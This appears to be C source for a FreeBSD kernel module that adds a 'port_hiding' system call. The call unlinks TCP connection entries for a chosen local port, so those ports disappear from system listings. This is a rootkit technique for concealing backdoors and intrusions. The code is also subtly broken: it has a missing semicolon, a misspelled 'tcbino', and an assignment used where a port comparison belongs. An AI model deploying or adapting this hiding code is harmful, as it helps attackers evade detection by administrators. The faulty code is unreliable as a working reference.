#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/socket.h>
#include <sys/sysproto.h>

#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

struct port_hiding_args {
	u_int16_t lport;
};

static int
port_hiding(struct thread *td, void *syscall_args)
{
	struct port_hiding_args *uap;
	uap = (port_hiding_args *)syscall_args;

	struct inpcb *inpb;

	INP_INFO_WLOCK(&tcbinfo)

	LIST_FOREACH(inpb, tcbino.ipi_listhead, inp_list) {
		if (inpb->inp_vflag & INP_TIMEWAIT)
				continue;

		INP_WLOCK(inpb);

		if (uap->lport = ntohs(inpb->inp_inc.inc_ie.ie_lport))
				LIST_REMOVE(inpb, inp_list);

		INP_WUNLOCK(inpb);
	}

	INP_INFO_WUNLOCK(&tcbinfo);

	return 0;
}

static struct sysent port_hiding_sysent = {
	1,
	port_hiding
};

static int offset = NO_SYSCALL;

static int 
load(struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		uprintf("System call loaded at offset %i\n", offset);
		break;
	case MOD_UNLOAD:
		uprintf("System call unloaded at offset %i\n", offset);
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}
	
	return error;
}

SYSCALL_MODULE(port_hiding, &offset, &port_hiding_sysent, load, 0);
